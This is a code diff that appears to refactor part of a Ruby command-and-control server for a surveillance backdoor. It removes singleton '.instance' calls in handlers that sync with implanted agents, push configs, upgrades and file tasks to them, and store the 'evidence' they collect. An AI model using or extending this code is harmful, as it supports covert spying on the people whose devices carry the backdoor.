@@ -62,10 +62,10 @@ module Commands
     now = Time.now - Time.now.utc_offset
 
     # notify the database that the sync is in progress
-    DB.instance.sync_start session[:bid], version, user_id, device_id, source_id, now
+    DB.sync_start session[:bid], version, user_id, device_id, source_id, now
 
     # notify the Evidence Manager that the sync is in progress
-    EvidenceManager.instance.sync_start session, version, user_id, device_id, source_id, now
+    EvidenceManager.sync_start session, version, user_id, device_id, source_id, now
 
     # response to the request
     command = [PROTO_OK].pack('I')
@@ -77,23 +77,23 @@ module Commands
     # ask to the db if there are any availables for the backdoor
     # the results are actually downloaded and saved locally
     # we will retrieve the content when the backdoor ask for them later
-    if DB.instance.new_conf? session[:bid] then
+    if DB.new_conf? session[:bid] then
       available += [PROTO_CONF].pack('I')
       trace :info, "[#{peer}][#{session[:cookie]}] Available: New config"
     end
-    if DB.instance.new_upgrade? session[:bid]
+    if DB.new_upgrade? session[:bid]
       available += [PROTO_UPGRADE].pack('I')
       trace :info, "[#{peer}][#{session[:cookie]}] Available: New upgrade"
     end
-    if DB.instance.new_downloads? session[:bid] then
+    if DB.new_downloads? session[:bid] then
       available += [PROTO_DOWNLOAD].pack('I')
       trace :info, "[#{peer}][#{session[:cookie]}] Available: New downloads"
     end
-    if DB.instance.new_uploads? session[:bid] then
+    if DB.new_uploads? session[:bid] then
       available += [PROTO_UPLOAD].pack('I')
       trace :info, "[#{peer}][#{session[:cookie]}] Available: New uploads"
     end
-    if DB.instance.new_filesystems? session[:bid]
+    if DB.new_filesystems? session[:bid]
       available += [PROTO_FILESYSTEM].pack('I')
       trace :info, "[#{peer}][#{session[:cookie]}] Available: New filesystems"
     end
@@ -113,13 +113,13 @@ module Commands
   def command_bye(peer, session, message)
 
     # notify the database that the sync is ended
-    DB.instance.sync_end session[:bid]
+    DB.sync_end session[:bid]
     
     # notify the Evidence Manager that the sync has ended
-    EvidenceManager.instance.sync_end session
+    EvidenceManager.sync_end session
 
     # destroy the current session
-    SessionManager.instance.delete(session[:cookie])
+    SessionManager.delete(session[:cookie])
 
     trace :info, "[#{peer}][#{session[:cookie]}] Synchronization completed"
 
@@ -134,7 +134,7 @@ module Commands
 
     # the conf was already retrieved (if any) during the ident phase
     # here we get just the content (locally) without asking again to the db
-    conf = DB.instance.new_conf session[:bid]
+    conf = DB.new_conf session[:bid]
 
     # send the response
     if conf.nil? then
@@ -158,7 +158,7 @@ module Commands
     # here we get just the content (locally) without asking again to the db
     # the database will output one upload at a time and the 'left' number of file
     # we pass it to the backdoor which will request again if left is greater than zero
-    upload, left = DB.instance.new_uploads session[:bid]
+    upload, left = DB.new_uploads session[:bid]
 
     # send the response
     if upload.nil? then
@@ -187,7 +187,7 @@ module Commands
     trace :info, "[#{peer}][#{session[:cookie]}] Upgrade request"
 
     # the upgrade list was already retrieved (if any) during the ident phase (like upload)
-    upgrade, left = DB.instance.new_upgrade session[:bid]
+    upgrade, left = DB.new_upgrade session[:bid]
 
     # send the response
     if upgrade.nil? then
@@ -217,7 +217,7 @@ module Commands
 
     # the download list was already retrieved (if any) during the ident phase
     # here we get just the content (locally) without asking again to the db
-    downloads = DB.instance.new_downloads session[:bid]
+    downloads = DB.new_downloads session[:bid]
 
     # send the response
     if downloads.empty? then
@@ -246,7 +246,7 @@ module Commands
 
     # the filesystem list was already retrieved (if any) during the ident phase
     # here we get just the content (locally) without asking again to the db
-    filesystems = DB.instance.new_filesystems session[:bid]
+    filesystems = DB.new_filesystems session[:bid]
 
     # send the response
     if filesystems.empty? then
@@ -277,7 +277,7 @@ module Commands
 
     # send the evidence to the db
     begin
-      EvidenceManager.instance.store session, size, message
+      EvidenceManager.store session, size, message
       #TODO: notify the pusher to send the evidence to db
           
       trace :info, "[#{peer}][#{session[:cookie]}] Evidence saved (#{size} bytes)"
